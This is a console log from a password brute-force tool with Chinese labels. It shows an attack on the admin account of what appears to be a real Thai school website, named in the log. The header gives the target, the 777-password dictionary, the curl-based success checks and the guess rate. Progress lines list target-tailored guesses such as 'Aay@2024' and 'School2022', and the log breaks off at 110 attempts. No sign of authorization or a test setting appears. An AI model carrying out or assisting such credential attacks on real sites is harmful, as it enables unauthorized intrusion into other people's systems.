╔════════════════════════════════════════════════════════╗
║     快速精确爆破 - 777个智能密码                     ║
╚════════════════════════════════════════════════════════╝

[+] 目标: https://aay.ac.th
[+] 用户: admin
[+] 字典: smart_passwords.txt (777 个)
[+] 方法: curl 4重验证（302+Location+Cookie+ErrorCheck）
[+] 速率: ~60个/分钟（1秒间隔）
[+] 预计时间: ~13分钟
[+] 开始: 13:36:32

═══════════════════════════════════════════════════════
[进度] 10/777 (1%) | 速度: 11/min | 剩余: 69分1秒 | 当前: Aay@2024
[进度] 20/777 (2%) | 速度: 10/min | 剩余: 73分10秒 | 当前: school@2025
[进度] 30/777 (3%) | 速度: 10/min | 剩余: 73分52秒 | 当前: School16
[进度] 40/777 (5%) | 速度: 9/min | 剩余: 76分46秒 | 当前: Bangkok@2024
[进度] 50/777 (6%) | 速度: 9/min | 剩余: 77分3秒 | 当前: Elibrary2025
[进度] 60/777 (7%) | 速度: 9/min | 剩余: 75分41秒 | 当前: School2022
[进度] 70/777 (9%) | 速度: 9/min | 剩余: 73分33秒 | 当前: School12
[进度] 80/777 (10%) | 速度: 9/min | 剩余: 72分10秒 | 当前: Eservice@2025
[进度] 90/777 (11%) | 速度: 9/min | 剩余: 70分51秒 | 当前: School2016
[进度] 100/777 (12%) | 速度: 9/min | 剩余: 74分34秒 | 当前: School22
[进度] 110/777 (14%) | 速度: 8/min | 剩余: 80分38秒 | 当前: Ayothaya@2024
